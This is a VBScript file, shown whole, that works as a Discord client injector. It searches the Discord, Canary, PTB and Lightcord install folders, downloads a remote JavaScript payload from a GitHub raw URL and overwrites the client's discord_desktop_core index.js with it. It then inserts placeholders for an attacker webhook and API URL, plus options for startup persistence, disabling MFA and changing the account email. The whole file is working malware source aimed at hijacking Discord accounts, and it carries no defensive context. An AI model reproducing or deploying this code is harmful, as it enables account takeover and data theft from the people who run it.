Dim fileSystem, mainFolder, subFolder, appFolder, moduleFolder, desktopFolder, file
Dim moviePath, appPattern, modulePattern, desktopPattern, indexPattern
Dim discordDirectories, injection_url, webhook_url, api_url, auto_user_profile_edit, auto_persist_startup, auto_mfa_disabler, auto_email_update
Dim userName, localAppDataPath

userName = CreateObject("WScript.Network").UserName

injection_url = "https://raw.githubusercontent.com/doxdk/discord-inj-v1/main/inj-on.js"

webhook_url = "replace_webhook_url"
api_url = "replace_api_url"
auto_user_profile_edit = "replace_auto_user_profile_edit"
auto_persist_startup = "replace_auto_persist_startup"
auto_mfa_disabler = "replace_auto_mfa_disabler"
auto_email_update = "replace_auto_email_update"

localAppDataPath = "C:\Users\" & userName & "\AppData\Local\"
discordDirectories = Array( _
    localAppDataPath & "discord\", _
    localAppDataPath & "discordcanary\", _
    localAppDataPath & "discordptb\", _
    localAppDataPath & "lightcord\" _
)

Set fileSystem = CreateObject("Scripting.FileSystemObject")
Set appPattern = CreateObject("VBScript.RegExp")
appPattern.Pattern = "app-"
Set modulePattern = CreateObject("VBScript.RegExp")
modulePattern.Pattern = "modules"
Set desktopPattern = CreateObject("VBScript.RegExp")
desktopPattern.Pattern = "discord_desktop_core-(\d+)"
Set indexPattern = CreateObject("VBScript.RegExp")
indexPattern.Pattern = "index\.js"

For Each folder In discordDirectories
    If fileSystem.FolderExists(folder) Then
        Set mainFolder = fileSystem.GetFolder(folder)
        
        For Each subFolder In mainFolder.SubFolders
            If appPattern.Test(subFolder.Name) Then
                
                For Each appFolder In subFolder.SubFolders
                    If modulePattern.Test(appFolder.Name) Then
                        
                        For Each moduleFolder In appFolder.SubFolders
                            If desktopPattern.Test(moduleFolder.Name) Then
                                
                                For Each desktopFolder In moduleFolder.SubFolders
                                    For Each file In desktopFolder.Files
                                        If indexPattern.Test(file.Name) Then
                                            
                                            filePath = file.Path
                                            Set textFile = fileSystem.OpenTextFile(filePath, 1)
                                            fileContent = textFile.ReadAll
                                            textFile.Close
                                            
                                            If fileContent = "module.exports = require(""./core.asar"");" Or Len(fileContent) < 20000 Then
                                                Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
                                                xmlHttp.open "GET", injection_url, False
                                                xmlHttp.send()
                                                
                                                If xmlHttp.Status = 200 Then
                                                    Set adoStream = CreateObject("ADODB.Stream")
                                                    adoStream.Open
                                                    adoStream.Type = 1
                                                    adoStream.Write xmlHttp.ResponseBody
                                                    adoStream.Position = 0
                                                    If fileSystem.FileExists(filePath) Then fileSystem.DeleteFile filePath
                                                    adoStream.SaveToFile filePath, 2
                                                    adoStream.Close
                                                    
                                                    Set textFile = fileSystem.OpenTextFile(filePath, 1)
                                                    fileContent = textFile.ReadAll
                                                    textFile.Close
                                                    
                                                    fileContent = Replace(fileContent, "%WEBHOOK_URL%", webhook_url)
                                                    fileContent = Replace(fileContent, "%API_URL%", api_url)
                                                    fileContent = Replace(fileContent, "%AUTO_USER_PROFILE_EDIT%", auto_user_profile_edit)
                                                    fileContent = Replace(fileContent, "%AUTO_PERSIST_STARTUP%", auto_persist_startup)
                                                    fileContent = Replace(fileContent, "%AUTO_MFA_DISABLER%", auto_mfa_disabler)
                                                    fileContent = Replace(fileContent, "%AUTO_EMAIL_UPDATE%", auto_email_update)
                                                    
                                                    Set textFile = fileSystem.OpenTextFile(filePath, 2)
                                                    textFile.Write fileContent
                                                    textFile.Close
                                                End If
                                                Set xmlHttp = Nothing
                                            End If
                                        End If
                                    Next
                                Next
                            End If
                        Next
                    End If
                Next
            End If
        Next
    End If
Next

Set fileSystem = Nothing
Set appPattern = Nothing
Set modulePattern = Nothing
Set desktopPattern = Nothing
Set indexPattern = Nothing
Set xmlHttp = Nothing
Set adoStream = Nothing
Set textFile = Nothing
